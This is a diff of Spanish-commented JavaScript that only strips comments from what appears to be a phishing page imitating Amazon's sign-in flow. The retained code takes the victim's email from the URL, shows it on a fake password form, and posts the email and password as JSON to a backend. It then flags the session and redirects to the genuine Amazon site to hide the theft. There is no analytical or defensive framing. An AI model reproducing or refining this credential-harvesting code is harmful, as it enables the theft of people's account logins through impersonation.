@@ -1,20 +1,16 @@
 (() => {
-  // 1) Si ya terminó, redirige (envuelto en try por compatibilidad)
   try {
     if (localStorage.getItem("amazon_auth_complete")) {
       window.location.replace("https://www.amazon.com/-/es/");
       return;
     }
   } catch {
-    // si localStorage falla, no se rompe el flujo
   }
 
-  // 2) Fix bfcache (Safari/back button)
   window.addEventListener("pageshow", (event) => {
     if (event.persisted) window.location.reload();
   });
 
-  // 3) Esperar DOM (para que getElementById no devuelva null)
   document.addEventListener("DOMContentLoaded", () => {
     const params = new URLSearchParams(window.location.search);
     const email = params.get("email");
@@ -32,12 +28,10 @@
     const emptyErrorAlert = document.getElementById("auth-password-missing-alert");
     const submitBtn = document.getElementById("submitBtn");
 
-    // Si falta algo crítico, no sigas (evita errores en mobile/desktop)
     if (!form || !passwordInput || !submitBtn) return;
 
     if (userEmailDisplay) userEmailDisplay.textContent = email;
 
-    // 4) Toggle mostrar contraseña (solo existe en móvil)
     const toggle = document.getElementById("showPasswordToggle");
     if (toggle) {
       toggle.addEventListener("change", () => {
@@ -45,7 +39,6 @@
       });
     }
 
-    // 5) Limpieza de errores al escribir
     passwordInput.addEventListener("input", () => {
       passwordInput.classList.remove("form-input-error");
       if (emptyErrorAlert) emptyErrorAlert.style.display = "none";
@@ -93,7 +86,6 @@
           body: JSON.stringify({ email, password }),
         });
 
-        // Si el backend no devuelve JSON, evita que reviente
         let data = {};
         try {
           data = await res.json();
